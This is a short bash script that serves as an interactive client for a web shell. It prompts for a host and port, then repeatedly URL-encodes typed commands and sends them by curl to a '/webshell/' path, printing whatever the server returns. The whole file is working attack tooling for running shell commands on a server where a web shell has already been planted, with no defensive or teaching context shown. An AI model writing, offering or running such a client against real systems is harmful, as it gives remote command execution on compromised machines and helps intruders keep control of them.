#!/bin/bash

read -p 'Host: ' host
read -p 'Port: ' port

while true; do
    read -p '$ ' raw_cmd
    cmd=$(printf %s "${raw_cmd}" | jq -sRr @uri)
    resp=$(curl -s -w "\n%{http_code}" \
    -o - "http://${host}:${port}/webshell/${cmd}")
    http_code=$(tail -n1 <<< "$resp")
    body=$(sed '$d' <<< "$resp")
    if [[ "${http_code}" =~ [0-9]{3} ]]; then
        if [ "${http_code}" -eq 200 ]; then
            echo "${body}"
        else
            echo "Error: HTTP status code ${http_code}"
        fi
    else
        echo "Error: Invalid HTTP status code received"
    fi
done
